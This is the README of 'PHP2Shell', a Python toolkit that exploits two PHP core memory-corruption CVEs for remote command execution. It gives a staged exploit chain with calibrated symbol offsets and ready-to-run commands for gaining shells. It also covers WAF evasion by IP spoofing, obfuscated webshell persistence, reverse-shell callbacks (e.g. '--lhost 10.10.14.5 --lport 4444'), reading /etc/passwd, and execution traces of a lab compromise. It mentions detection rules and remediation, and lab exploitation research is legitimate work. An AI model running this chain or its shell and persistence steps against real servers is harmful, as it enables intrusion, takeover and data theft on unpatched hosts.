# 🔬 PHP2Shell — Research & Exploitation Toolkit (v2.2.1)

<p align="center">
  <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-109618"><img src="https://img.shields.io/badge/CVE--2026--109618-CRITICAL%20(9.2)-e74c3c?style=for-the-badge" alt="CVE-2026-109618"></a>
  <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-109619"><img src="https://img.shields.io/badge/CVE--2026--109619-CRITICAL%20(9.2)-e74c3c?style=for-the-badge" alt="CVE-2026-109619"></a>
  <a href="https://www.exploit-db.com/exploits/52704"><img src="https://img.shields.io/badge/EXPLOIT--DB-%2352704-e67e22?style=for-the-badge" alt="Exploit-DB #52704"></a>
  <a href="https://portal.offsec.com/machine/cve-2026-109618-255610/overview/"><img src="https://img.shields.io/badge/OFFSEC%20LAB-100%25%20SOLVED-27ae60?style=for-the-badge" alt="OffSec Lab 100% Solved"></a>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/PYTHON-3.9+-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python">
  <a href="php2shell.py"><img src="https://img.shields.io/badge/TOOLKIT-V2.2.1-2ecc71?style=for-the-badge" alt="Toolkit"></a>
</p>

<p align="center">
  <strong>Comprehensive research, defensive auditing, and unified exploitation suite for CVE-2026-109618 & CVE-2026-109619 — critical PHP core vulnerabilities.</strong><br>
  <em>Features an all-in-one script (<code>php2shell.py</code>) with assessment phases (Recon → Passive Fingerprinting → Behavioral Probing → WAF Diagnostics) and separately opt-in exploit/shell functions.</em>
</p>

---

## 📋 Vulnerability Overview

PHP2Shell provides discovery, differential analysis, and weaponized verification for two critical remote vulnerabilities in PHP's core memory allocator and multipart request parsing subsystems:

| CVE | Vulnerability Type | CVSS | Affected Branches | Fixed Releases |
|---|---|---|---|---|
| **CVE-2026-109618** | RFC 1867 OOM Uninitialized Memory Corruption | **9.2** Critical | PHP 5.4 – 8.2 (< 8.2.35), 8.3 (< 8.3.36), 8.4 (< 8.4.27), 8.5 (< 8.5.12) | **8.2.35, 8.3.36, 8.4.27, 8.5.12** |
| **CVE-2026-109619** | Stale Global State (`SG()` / `PG()`) Use-After-Free | **9.2** Critical | PHP 5.4 – 8.2 (< 8.2.35), 8.3 (< 8.3.36), 8.4 (< 8.4.27), 8.5 (< 8.5.12) | **8.2.35, 8.3.36, 8.4.27, 8.5.12** |

### ⛓️ Exploitation Chain Summary
1. **RFC 1867 OOM Bailout**: Deeply nested multipart arrays induce a memory allocation error triggering `zend_bailout()`, bypassing standard request cleanup.
2. **Worker State Poisoning (UAF)**: Some PHP request handlers reuse workers, allowing request-owned state to survive into a later request under vulnerable conditions. HTTP Keep-Alive alone does not guarantee two requests reach the same PHP worker.
3. **Exploit-DB #52704 Chain**:
   - **Stage 0**: HTTP worker rotation (aborting current worker so prefork forks a clean child).
   - **Stage 1**: `Set-Cookie` heap leak yielding the Zend MM 2MB chunk base.
   - **Stage 2**: `Set-Cookie` 56-byte HashTable page leak disclosing the `libphp` base address (`ZVAL_PTR_DTOR`).
   - **Stage 3**: `PHP_SESSION_UPLOAD_PROGRESS` fake reference hijacking with `pDestructor` pointed to `zif_system` for arbitrary command execution.

---

---

## 🏆 OffSec Lab Challenge: CVE-2026-109618 (100% Verified)

> [!NOTE]
> **Lab Target Environment**:
> - **Platform**: [OffSec Challenge: CVE-2026-109618](https://portal.offsec.com/machine/cve-2026-109618-255610/overview/)
> - **OS & Service**: Debian 13 (Trixie), Apache 2.4.69 MPM Prefork (`MaxRequestWorkers 1`)
> - **PHP Core Runtime**: Official `php:8.4.26-apache` Docker container (`sha256:60111400ff77bdc44fa79b4f072afe49a42abba71e0846ad496be4761dc9c11a`)
> - **Flag Target**: `/var/www/proof.txt` (Mode 0400, owned by `www-data`)

### ⚠️ Why the Raw Public PoC (Exploit-DB #52704) Fails Out-of-the-Box
For public research or non-lab environments, you can review the original raw reference script at **[Exploit-DB #52704](https://www.exploit-db.com/exploits/52704)** ([raw source](https://www.exploit-db.com/raw/52704) credited to 9bie & eness).

However, running the public PoC unmodified against the OffSec lab target fails at multiple stages:
1. **Hardcoded Symbol Offsets**: Public 52704 defaults to 9bie's custom lab-build offsets (`zif_system=0x43A870`, `zval_ptr_dtor=0x613C50`). In Debian 13 `trixie` (`php:8.4.26-apache`), the real symbol offsets are `zif_system=0x465370` and `zval_ptr_dtor=0x65EB60`.
2. **ASLR Address Scan Window**: Public 52704 filters leaked pointers strictly within `[0x7F0000000000, 0x800000000000)`, assuming `mmap_rnd_bits=28`. The OffSec lab kernel enforces `mmap_rnd_bits=32`, mapping chunks and `libphp.so` around `0x6F...` / `0x70...`. As a result, public 52704 leaks 4096 bytes but discards every address as `0`.
3. **Transport Concurrency & Socket RST Handling**: When the PHP worker triggers OOM and bails out mid-body upload, blocking synchronous HTTP clients receive a TCP connection reset (`ECONNRESET`) and discard the in-flight Set-Cookie. PHP2Shell implements concurrent reader threading to reliably capture memory leaks even during socket aborts.
4. **Out-of-Band Proof Exfiltration**: Public 52704 assumes a shared Docker bind-mount (`/out/p1`), which does not exist in remote lab challenges. The intended solve path is copying the proof file into the Apache webroot (`cp ../p* .`) and retrieving it via HTTP GET.

### 🚀 Verified One-Click OffSec Lab Command
Run this command from Kali against your assigned target IP:

```bash
python3 php2shell.py http://192.168.72.10/ \
  --exploit \
  --exploit-method binary \
  --exploit-profile trixie \
  --cmd "cp ../p* ." \
  --fetch /proof.txt \
  --timeout 30 \
  -o ~/php2shell-flag
```

#### Verified Terminal Execution Trace:
```text
[15:07:46] [5/5 EXPLOIT] Executing weaponized kill-chain against: http://192.168.72.10
[15:07:46]   └─ [Exploit-DB #52704] Starting memory corruption chain (profile=trixie)...
[15:07:46]   └─ [Preflight Notice]: Target returned 'Connection: close'. Proceeding (single-worker container preserves affinity).
[15:07:46]   └─ [Profile Notice]: Profile 'trixie' / 'debian13' using calibrated offsets (zif_system=0x465370, zval_ptr_dtor=0x65EB60).
[15:07:46]   └─ Stage 0: Rotating worker process over HTTP...
[15:07:47]   └─ Stage 1: Heap leak attempt 1/3...
[15:07:48]   └─ [Heap Leak]: Zend MM chunk base: 0x71937d600000
[15:07:49]   └─ Stage 2: LibPHP leak attempt 1/3...
[15:07:50]   └─ [LibPHP Leak]: libphp base: 0x71937f216000
[15:07:51]   └─ Stage 3: Executing zif_system (HTDATA=0x71937d6690d8, ZIF=0x71937f67b370)...
[15:07:54]   └─ [Proof Check]: GET /proof.txt -> HTTP 200 (32B)
[15:07:54]   └─ [SUCCESS]: Proof confirmed via /proof.txt: 31050b60beddc661b64e11663431d2fa

$ curl -i http://192.168.72.10/proof.txt
HTTP/1.1 200 OK
Server: Apache/2.4.69 (Debian)
Content-Length: 32

31050b60beddc661b64e11663431d2fa
```

## 🚀 Key Features

- ⚡ **All-In-One Unified Engine (`php2shell.py`)**:
  - Single executable script combining the entire kill-chain with zero duplicate logic.
  - Continuous execution: probes all discovered endpoints and continues through all 5 stages end-to-end (`--all`).
  - Single-request optimization: Version and runtime metadata are collected together in a single passive response where possible, with endpoint fallback.
  - Real-time timestamped progress reporting after each pipeline phase (`[1/5]` through `[5/5]` and `[Shell]`).
- 🔍 **Enhanced Pre-Scan Reconnaissance**:
  - Comprehensive built-in wordlist (120+ PHP paths covering uploads, CMSs, administration, database managers, and APIs).
  - Custom wordlist file support (`-w` / `--wordlist`).
  - Remote wordlist synchronization: directly fetch and merge the latest GitHub SecLists (`--remote-wordlist`).
  - `robots.txt` and `sitemap.xml` harvesting.
  - WAF detection (Cloudflare, AWS WAF, Akamai, ModSecurity, Imperva, F5 ASM, Sucuri, etc.).
  - CMS fingerprinting (WordPress, Drupal, Joomla, Magento, OpenCart, PrestaShop, Laravel, Symfony).
  - Subdomain enumeration via `crt.sh` Certificate Transparency logs.
- 🔬 **Passive Fingerprinting**:
  - Non-invasive version inspection from `X-Powered-By`, `Server`, `Set-Cookie` (`PHPSESSID`), and exposed `phpinfo()` files (`/phpinfo.php`, `/info.php`, `/php_info.php`, `/test.php`, `/i.php`).
  - Automated evaluation against official core patch thresholds and EOL status.
- 🧪 **Active Behavioral Differential Probing**:
  - Dispatches 62-level nested multipart arrays (512 KiB to 8 MiB) and upload-progress probes.
  - Auto-fails over across discovered endpoints if one endpoint returns 404 or connection error.
  - Identifies worker crashes, HTTP 500/502/503 status codes, and timing deltas without executing destructive code.
- 🛡️ **WAF Evasion & Diagnostic Analysis**:
  - Tests target responses to chunked `Transfer-Encoding`, unusual multipart boundary characters, and spoofed IP headers (`X-Forwarded-For`, `X-Real-IP`).
- 💥 **Automated Weaponized Exploitation & Payload Staging**:
  - **Automated Payload Staging**: Bypasses the 14-byte carrier limit by staging arbitrarily long commands (reverse shells, complex chains) into persistent `/tmp/phpXXXXXX` files via RFC 1867 multipart parsing + OOM bailout, invoked automatically via `sh /tmp/php*` (customizable via `--carrier-trigger`).
  - **Exploit-DB #52704**: Native binary leak and `zif_system` execution supporting both `bookworm` (`php:8.4.26-apache`) and `lab` builds.
  - **Autonomous RCE Fallback**: If the binary leak chain is unconfirmed in `auto` mode, the engine seamlessly falls through to multipart webshell persistence without terminating.
  - **Automated Proof Redirection & Fresh HTTP Verification**: When `--proof-file` is specified, commands are automatically wrapped to capture output (`({cmd}) > {proof_file} 2>&1`). `--fetch` verifies newly created/modified HTTP responses.
  - **Webshell Persistence**: Automated obfuscated PHP webshell deployment across common writable directories with output delimiters.
  - **Multi-Endpoint Fallback**: Automatically retries webshell deployment across alternative discovered endpoints if the first fails.
- 💻 **Persistent Interactive Shell**:
  - Drops into a live pseudo-terminal (`www-data@target:/var/www/html$`) with directory tracking (`cd`).
  - **Ctrl+C Confirmation Guard**: Intercepts `KeyboardInterrupt` and prompts before exiting so sessions never drop accidentally.
- 📡 **Built-in Reverse Shell Listener with Auto-IP Prompt**:
  - Interactive auto-detection of operator local network interface IP.
  - Prompts operator for `LHOST`/`LPORT` confirmation when `--reverse` is invoked without parameters, and seamlessly handles headless execution.
  - Native listener on `0.0.0.0:LPORT` with interactive two-way streaming.
  - Automatic re-listen and payload re-trigger options with operator confirmation (`y/N`).
- 🧪 **Standalone Lab (No Docker Required)**:
  - Built-in lightweight test server (`lab/standalone_lab.py`) serving fixtures from `lab/app/` to validate the toolkit locally.

---

## 📦 Installation & Setup

### ⚙️ Prerequisites
- Python 3.9 or higher
- `pip` package manager

```bash
# Clone the repository
git clone https://github.com/umair-aziz025/PHP2Shell.git
cd PHP2Shell

# Install required dependencies
pip install -r requirements.txt
```

---

## ⚡ Usage & Examples

The primary script ([`php2shell.py`](php2shell.py)) handles all tasks in one single file:

### 🚀 1. Full Pipeline Execution (Recon → Passive → Probes → WAF → Exploit)
```bash
# Run the complete end-to-end pipeline across all 5 stages
python php2shell.py http://target.lab:8088/ --all -v

# Run non-destructive assessment only (Recon, Passive, Active Probes, WAF)
python php2shell.py http://target.lab:8088/ --recon --active --waf -v
```

### 🔍 2. Reconnaissance with Custom Wordlist or Remote SecLists
```bash
# Using a local custom wordlist
python php2shell.py http://target.lab:8088/ --recon -w my_wordlist.txt -v

# Fetching latest remote SecLists PHP filenames directly from GitHub
python php2shell.py http://target.lab:8088/ --recon --remote-wordlist -v
```

### 💻 3. Auto-Exploit with Automatic Payload Staging & Interactive Shell
```bash
# Drops into persistent interactive shell console upon compromise
python php2shell.py http://target.lab:8088/ --all --shell

# Arbitrary length commands are automatically staged via multipart upload
python php2shell.py http://target.lab:8088/ --exploit --cmd "whoami; id; uname -a; cat /etc/passwd"
```

### 📡 4. Built-in Interactive Reverse Shell with Auto-IP Prompt
```bash
# Automatically detects local network IP and prompts for LHOST/LPORT confirmation
python php2shell.py http://target.lab:8088/ --all --reverse

# Or supply explicit listener parameters
python php2shell.py http://target.lab:8088/ --all --lhost 10.10.14.5 --lport 4444
```

### 🎯 5. Binary Memory Corruption Chain (OffSec Lab & Custom Targets)

#### For OffSec CVE-2026-109618 Lab Target (Debian 13 Trixie):
```bash
python php2shell.py http://192.168.72.10/ \
  --exploit \
  --exploit-method binary \
  --exploit-profile trixie \
  --cmd "cp ../p* ." \
  --fetch /proof.txt
```

#### For Generic / Public Build Targets (or using raw ELF symbols):
For general public targets or custom PHP compilations, inspect the upstream reference [Exploit-DB #52704](https://www.exploit-db.com/exploits/52704) or supply the target binary directly for automatic offset extraction:
```bash
# Auto-extract symbols directly from the target's libphp.so
python php2shell.py http://target.lab:8088/index.php \
  --exploit \
  --exploit-method binary \
  --elf /path/to/extracted/libphp.so \
  --cmd "whoami"

# Or manually supply symbol offsets
python php2shell.py http://target.lab:8088/index.php \
  --exploit \
  --exploit-method binary \
  --zif-offset 0x465370 \
  --dtor-offset 0x65eb60 \
  --cmd "id"
```

### 📊 6. Multi-Target Batch Audit with Report Export
```bash
python php2shell.py -f targets.txt --recon --active --waf -o audit_report
```
*Generates both `audit_report.json` and `audit_report.md`.*

---

## 🧪 Testing with the Standalone Lab (No Docker Needed)

You can exercise the full scan-to-shell pipeline locally without installing Docker or a native PHP binary. The lightweight test server (`lab/standalone_lab.py`) simulates vulnerable PHP 8.4.26 Apache `mod_php` endpoints, differential OOM/UAF memory errors, WAF bypass behaviors, and interactive webshell command execution.

### How to Run the Lab Test

#### Step 1: Start the Lab Server (Terminal 1)
```bash
python lab/standalone_lab.py --port 8899
```
*Output:*
```text
[*] Starting Standalone PHP2Shell Lab on http://127.0.0.1:8899 (Simulating PHP 8.4.26)...
```

#### Step 2: Run the Full Kill-Chain & Gain Interactive Shell (Terminal 2)
```bash
python php2shell.py http://127.0.0.1:8899/ --all --shell
```

---

### Expected Output

When running the full pipeline against the lab, you will see each phase complete sequentially, culminating in an interactive shell session:

```text
  ____  _   _ ____  ____  ____  _          _ _
 |  _ \| | | |  _ \|___ \/ ___|| |__   ___| | |
 | |_) | |_| | |_) | __) \___ \| '_ \ / _ \ | |
 |  __/|  _  |  __/ / __/ ___) | | | |  __/ | |
 |_|   |_| |_|_|   |_____|____/|_| |_|\___|_|_|
                     Toolkit v2.2.1

   PHP Vulnerability & Weaponized Exploitation Pipeline
   Recon → Passive → Behavioral Probing → WAF → Exploit → Shell
   CVE-2026-109618 | CVE-2026-109619 (CVSS 9.2 RCE)
   [Exploit-DB #52704 & UAF Stale State Integration]
   -------------------------------------------------------------

[*] Starting Unified PHP2Shell run across 1 target(s)...
[*] Active wordlist: 113 endpoint paths loaded.

======================================================================
TARGET: http://127.0.0.1:8899/
======================================================================
[11:27:59] [1/5 RECON] Probing target architecture and attack surface: http://127.0.0.1:8899/
[11:27:59]   └─ CMS: Detected: Magento
[11:28:01] [1/5 RECON] Complete: 5 endpoints, 0 WAFs.
[11:28:01] [2/5 PASSIVE] Auditing PHP version & runtime state: http://127.0.0.1:8899/
[11:28:01] [2/5 PASSIVE] PHP: 8.4.26 | SAPI: unknown | Status: vulnerable
[11:28:01] [3/5 ACTIVE] Dispatching differential OOM & UAF probes to: http://127.0.0.1:8899/upload.php
[11:28:01]   └─ Baseline: HTTP 200 (0.02s) on http://127.0.0.1:8899/upload.php
[11:28:01]   └─ Nested Array Probe: HTTP 500 (diff=True, OOM sig matched)
[11:28:01]   └─ Upload Progress Probe: HTTP 500 (diff=True, OOM/UAF sig matched)
[11:28:01] [3/5 ACTIVE] Outcome: likely_vulnerable (High confidence: 2 differential probe responses.)
[11:28:01] [4/5 WAF] Assessing WAF evasion & bypass vectors: http://127.0.0.1:8899/upload.php
[11:28:01]   └─ Test: chunked Transfer-Encoding -> PASSED (HTTP 200)
[11:28:01]   └─ Test: unusual multipart boundary -> PASSED (HTTP 200)
[11:28:01]   └─ Test: X-Forwarded-For IP spoofing -> PASSED (HTTP 200)
[11:28:01] [4/5 WAF] WAF: None | Bypasses confirmed: 3
[11:28:01] [5/5 EXPLOIT] Executing weaponized kill-chain against: http://127.0.0.1:8899/upload.php
[11:28:01]   └─ [Exploit-DB #52704] Starting memory corruption chain (profile=bookworm)...
[11:28:01]   └─ [Auto-Staging]: Command (20B > 14B limit) automatically staged via multipart upload -> trigger: 'sh /tmp/php*'
[11:28:01]   └─ Stage 0: Rotating worker process over HTTP...
[11:28:02]   └─ Stage 1: Heap leak attempt 1/3...
[11:28:03]   └─ Stage 1: Heap leak attempt 2/3...
[11:28:05]   └─ Stage 1: Heap leak attempt 3/3...
[11:28:06]   └─ [Auto-Chain Fallback]: Binary stage unconfirmed; proceeding to multipart webshell persistence...
[11:28:06]   └─ [Webshell Dropper] Engaging multipart OOM & UAF persistence dropper...
[11:28:06]   └─ [WEBSHELL LIVE]: http://127.0.0.1:8899/p2s_shell.php (param: nrtnxm)
[11:28:06]   └─ Command Output: 
...
[*] Dropping into interactive shell console at http://127.0.0.1:8899/p2s_shell.php
[*] Persistent session active. Session will NOT close automatically.
[*] Type 'exit' or 'quit' to terminate session.

www-data@php2shell-lab:/var/www/html$ 
```

---

## 📖 CLI Reference: `php2shell.py`

| Flag | Category | Description |
|---|---|---|
| `targets` | Target | Target URL(s) or CIDR range (`192.168.1.0/24`) |
| `-f, --file FILE` | Target | File containing target URLs (one per line) |
| `-o, --output BASE` | Reporting | Base path for JSON and Markdown reports |
| `-t, --threads N` | Performance | Deprecated compatibility flag; current target loop is sequential (value ignored) |
| `--timeout SECS` | Network | Request timeout in seconds (default: `10`) |
| `-v, --verbose` | Logging | Enable detailed stage output and diagnostic logs |
| `--json` | Output | Output structured JSON only (cannot be combined with `-o`, `--shell`, or reverse-listener options) |
| `--all, --full` | Pipeline | Run all 5 stages end-to-end (Recon → Passive → Probes → WAF → Exploit) |
| `--recon` | Stage 1 | Run endpoint discovery, CMS detection, WAF identification |
| `-w, --wordlist FILE` | Stage 1 | Path to custom endpoint wordlist file |
| `--remote-wordlist` | Stage 1 | Download and merge latest GitHub SecLists PHP filenames wordlist |
| `--max-endpoints N` | Stage 1 | Maximum endpoints to probe in recon (default: `150`) |
| `--subdomain-enum` | Stage 1 | Query `crt.sh` Certificate Transparency logs for subdomains |
| `--active` | Stage 3 | Run behavioral differential probes (62-level nested array & UAF) |
| `--waf` | Stage 4 | Run WAF evasion diagnostics (chunked encoding, boundary, IP spoof) |
| `--exploit, --auto-shell` | Stage 5 | Run weaponized exploitation chain |
| `--shell` | Stage 6 | Drop into persistent interactive shell session upon successful exploitation |
| `--cmd COMMAND` | Exploit | Initial command to execute (default: `id; whoami; uname -a`) |
| `--webshell-name NAME` | Exploit | Custom filename for dropped webshell (default: `p2s_shell.php`) |
| `--exploit-method` | Exploit | Method selection: `auto` (default), `binary` (52704), or `upload` |
| `--exploit-profile` | Exploit | Target build profile: `bookworm` (default), `trixie` / `debian13`, or `lab` |
| `--stage1-n N` | Exploit | Custom Stage 1 multipart count for precision calibration |
| `--stage2-t N` | Exploit | Custom Stage 2 target bucket index |
| `--stage2-v N` | Exploit | Custom Stage 2 value allocation size |
| `--auto-calibrate` | Exploit | Sweep candidate Stage 1 allocation counts (`stage1_n`) if initial leak returns 0 (default: enabled) |
| `--pin-worker` | Exploit | Enable HTTP/1.1 persistent connection worker pinning (default: enabled) |
| `--force` | Exploit | Bypass preflight worker-pinning check and attempt binary exploitation anyway |
| `--elf, --libphp PATH` | Exploit | Auto-extract `zif_system` and `zval_ptr_dtor` symbol offsets from `libphp.so` or `php` ELF binary |
| `--zif-offset OFFSET` | Exploit | Custom hexadecimal offset for `zif_system` in `libphp.so` |
| `--dtor-offset OFFSET` | Exploit | Custom hexadecimal offset for `zval_ptr_dtor` |
| `--htdata-offset OFFSET` | Exploit | Custom offset for the 167-byte fake HashTable carrier |
| `--proof-file PATH` | Exploit | Local file path to read and verify execution proof |
| `--fetch PATH` | Exploit | Remote path to fetch via GET to verify execution proof |
| `--huge-mb MB` | Exploit | Memory allocation in MB to trigger OOM (default: `12`) |
| `--carrier-trigger CMD` | Exploit | Custom short trigger command for staged payload (default: `sh /tmp/php*`) |
| `--lhost IP` | Reverse Shell | Listener IP address for reverse shell callback |
| `--lport PORT` | Reverse Shell | Listener port for reverse shell callback (default: `4444`) |
| `--reverse` | Reverse Shell | Trigger automatic reverse shell dispatch |

---

## 📁 Repository Structure

```
PHP2Shell/
│
├── php2shell.py                       # ⚡ Single monolithic scan-to-shell script (Zero duplicates)
├── requirements.txt                   # Python package dependencies
├── setup.py                           # Package installation configuration
├── README.md                          # Main documentation & safety guidelines
│
├── detection/                         # Defensive detection & monitoring rules
│   ├── README.md                      # Detection deployment guide
│   ├── sigma/                         # Sigma rules for SIEM event logs
│   ├── snort/                         # Snort NIDS signatures
│   ├── suricata/                      # Suricata IDS/IPS rules
│   └── yara/                          # YARA file & memory scanner rules
│
├── lab/                               # Test environments
│   ├── standalone_lab.py              # 🧪 Lightweight Python lab server (No Docker needed)
│   ├── docker-compose.yml             # Dockerized multi-version test environment
│   ├── LAB_SETUP.md                   # Comprehensive lab documentation
│   └── app/                           # Test application fixtures
│       ├── index.php                  # Primary test endpoint
│       └── phpinfo.php                # Fingerprinting fixture
│
├── advisory/
│   └── TECHNICAL_ADVISORY.md          # Technical root cause analysis & CVSS breakdown
│
└── remediation/
    └── REMEDIATION_GUIDE.md           # Distribution-specific patching & mitigation guide
```

---

## 🔬 Threat Intelligence & Reference Verification

The techniques and detection logic in this toolkit have been validated against vendor advisories and research publications:

- **Security Research Advisory**: [PHP2Shell — Critical Vulnerabilities in PHP Core](https://www.offsec.com/blog/php2shell-critical-vulnerabilities-in-php-core/) (October 22, 2026)
- **Assetnote Scanner**: [assetnote/php2shell-scanner](https://github.com/assetnote/php2shell-scanner) (RFC 1867 & PHP upload progress scanner)
- **Exploit-DB #52704**: [php2shell - one-click remote exploit for PHP 8.4.26 / mod_php, prefork](https://www.exploit-db.com/exploits/52704) (9bie & Exploit-DB)
- **PHP Project Advisories**:
  - [GHSA-w8hw-w9fx-j79w](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w) (CVE-2026-109618 — OOM corruption)
  - [GHSA-6wmf-4rv5-p3rp](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp) (CVE-2026-109619 — stale global state)
- **Calif.io Deep Dive**: [PHP2Shell: Under the Hood of PHP Core Memory Corruption](https://calif.io/php2shell/#php-5-4-0-rce)
- **Datadog Security Labs**: [PHP2Shell Critical Vulnerabilities in PHP](https://securitylabs.datadoghq.com/articles/php2shell-critical-vulnerabilities-in-php/)
- **CrowdStrike Falcon**: [CrowdStrike Protects Customers from PHP RCE Zero-Days](https://www.crowdstrike.com/en-us/blog/crowdstrike-protects-customers-from-php-rce-zero-days/)
- **Wiz.io Threat Intel**: [PHP2Shell Cloud Threat Analysis](https://www.wiz.io/blog/php2shell-php-rce)

---

## 🛡️ Validation Scope & Reliability Notes

- **Version evidence is not proof of exploitability.** Headers such as `X-Powered-By` can be hidden or falsified; confirm versions through an authenticated system inventory before reporting a host as affected.
- **No-Docker lab limitations:** `lab/standalone_lab.py` is an HTTP simulation and does not execute PHP or reproduce memory corruption. A successful fixture response should be classified as a scanner integration check, not an exploit result.
- **Exploit-DB portability:** EDB-52704 documents a build-specific proof of concept with assumptions about PHP, Apache, worker lifecycle, PHP configuration, and binary offsets. Do not represent it as universally reliable across affected versions or SAPIs.
- **Command size & Automatic Payload Staging:** While the original 167-byte `zend_string` layout had a 14-byte inline command ceiling, PHP2Shell v2.2.1 provides automatic multipart payload staging: commands exceeding 14 bytes are uploaded to `/tmp/php*` via RFC 1867 multipart form parsing paired with an OOM bailout, and invoked via the compact `sh /tmp/php*` trigger.
- **Safety and error handling:** Prefer explicit `unknown` or `not verified` results where evidence is insufficient. Restrict testing to disposable, authorized lab systems, and avoid treating timeouts or HTTP 500 responses alone as proof of vulnerability.
- **Reference review (October 23, 2026):** Upstream PHP security advisories, vulnerability research write-ups, Calif research, Datadog, Wiz, CrowdStrike, and Exploit-DB pages are accessible.

### Result Verification & Command Handling

- **Automatic Payload Staging**: Commands exceeding the 14-byte limit (such as reverse shells or chained commands) are automatically staged into `/tmp` via RFC 1867 multipart upload paired with an OOM bailout, and executed via a compact 12-byte carrier trigger (`sh /tmp/php*`, customizable with `--carrier-trigger`). Direct commands <= 14 bytes execute directly without staging.
- **Execution Proof Capture**: When using `--proof-file`, the command output is automatically redirected to capture execution evidence (`({cmd}) > {proof_file} 2>&1`). An unchanged, pre-existing file cannot serve as fresh proof.
- **Fresh HTTP Fetch Verification**: When `--fetch PATH` is used, the toolkit records state before exploitation and verifies that the returned response contains freshly created or modified output from the executed command.
- **Reverse Shell Integration**: When `--reverse` is used without `--lhost`, the tool automatically detects the local network interface IP and interactively prompts for confirmation. The built-in listener catches incoming connections for both binary and webshell exploit methods.
